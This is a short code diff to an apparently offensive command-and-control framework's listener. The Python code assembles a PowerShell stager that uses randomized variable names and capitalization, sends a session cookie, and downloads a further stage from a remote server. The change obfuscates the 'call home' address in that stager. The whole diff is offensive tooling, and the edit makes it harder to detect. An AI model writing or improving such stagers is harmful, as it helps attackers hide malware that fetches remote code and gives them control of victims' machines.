@@ -221,7 +221,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                 stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                stager += "$ser='%s';$t='%s';" % (helpers.obfuscate_call_home_address(host), stage0)
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
